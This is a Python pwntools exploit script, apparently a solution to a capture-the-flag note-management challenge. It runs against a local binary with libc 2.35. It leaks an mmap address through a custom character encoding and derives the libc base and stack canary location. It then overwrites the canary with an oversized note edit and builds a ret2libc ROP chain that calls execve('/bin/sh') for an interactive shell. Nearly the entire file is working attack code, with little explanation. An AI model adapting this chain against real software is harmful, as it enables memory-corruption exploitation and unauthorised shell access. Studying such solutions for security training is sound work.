#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# libc 2.35

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)

def create(idx, size, data):
    sla(b' : ', b'1')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(size).encode())
    sla(b'note: ', data)

def edit(idx, data):
    sla(b' : ', b'2')
    sla(b'Index: ', str(idx).encode())
    sla(b'note: ', data)

def show(idx):
    sla(b' : ', b'3')
    sla(b'? ', str(idx).encode())

def delete(idx):
    sla(b' : ', b'4')
    sla(b'Index: ', str(idx).encode())

def GDB():     # Wsl2
    from clipboard import copy
    # copy('x/50xg &gNotes')
    copy('b posix_spawn')
    import os
    script = '''
    #!/bin/sh

    cd /home/johnathanhuutri/mmapnote
    '''
    script += f'gdb -p {p.pid} -x /tmp/command.gdb'
    with open('/tmp/script.sh', 'w') as f: f.write(script)
    os.system("chmod +x /tmp/script.sh")

    command = '''
    b*main+47
    b*readchoice+81
    b*add+312
    b*delete+216
    b*delete+256
    b*edit+233
    b*readline+45
    c
    '''
    command += 'c\n'*9
    command += 'search-pattern BBBBB\n'
    gdb.attach(p, gdbscript=command)

p = process(exe.path)

####################################
### Stage 1: Leak mmaped address ###
####################################
alphabet = b'MmApIsSafeDoNtYOuThink'
#    7ffff7d8f000
# = 'MMMOftaOOOOa'[::-1]
# = 'aOOOOatfOMMM'
create(0, 0x2000, b'0')
show(0)
p.recvuntil(b'of note ')

s = p.recvline()[:-2]
mmaped_addr = 0
bit = 0
for i in s:
	mmaped_addr += alphabet.index(i) << bit
	bit += 4
log.info("Leak mmaped address: " + hex(mmaped_addr))

##################################
### Stage 2: Leak libc address ###
##################################
libc.address = mmaped_addr + 0x5000
canary_addr = libc.address - 0x2898
fs = canary_addr - 0x28
unknown_scanf = fs - 144

log.info("Libc base: " + hex(libc.address))
log.info("Canary: " + hex(canary_addr))
log.info("[fs]: " + hex(fs))
log.info("Unknown of scanf: " + hex(unknown_scanf))

#########################
### Stage 3: Ret2Libc ###
#########################
# Change size to 0x5000
sla(b' : ', b'1')
sla(b'Index: ', str(0).encode())
sla(b'Size: ', str(0x5000).encode())

# Keep the same address so we will not get segfault
# in function posix_spawn of scanf
sla(b' : ', b'2')
sla(b'Index: ', str(0).encode())

payload = b'A'*0x26b0 + p64(libc.address + 0x21a580)    # Keep this address
payload = payload.ljust(0x2758, b'B')
payload += p64(0)*2
sa(b'note: ', payload)
p.sendline(p64(0))    # Overwrite canary

# Ret2Libc now
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_r12 = libc.address + 0x000000000011f497 
ret = libc.address + 0x0000000000029cd6

payload = cyclic(cyclic_find('gaaa'))
payload += p64(0)
payload = payload.ljust(cyclic_find('kaaa'), b'B')
payload += flat(
	pop_rdi, next(libc.search(b'/bin/sh')),
	pop_rsi, 0,
	libc.sym['execve']
	)
sla(b' : ', payload)

p.interactive()
